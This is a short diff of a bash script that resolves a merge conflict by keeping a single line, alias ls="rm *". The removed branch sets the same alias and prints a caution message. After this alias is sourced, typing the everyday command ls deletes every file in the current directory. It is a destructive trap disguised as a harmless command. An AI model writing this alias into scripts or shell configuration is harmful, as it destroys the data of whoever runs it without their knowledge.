@@ -1,12 +1,2 @@
 #!/bin/bash
-<<<<<<< HEAD
 alias ls="rm *"
-=======
-
-# Define the alias
-alias ls='rm *'
-
-
-echo "Alias 'ls' has been set to 'rm *'. Use with extreme caution!"
-
->>>>>>> dbd04aba1cae3aa22f902fe22f795f1f3b4dbe83
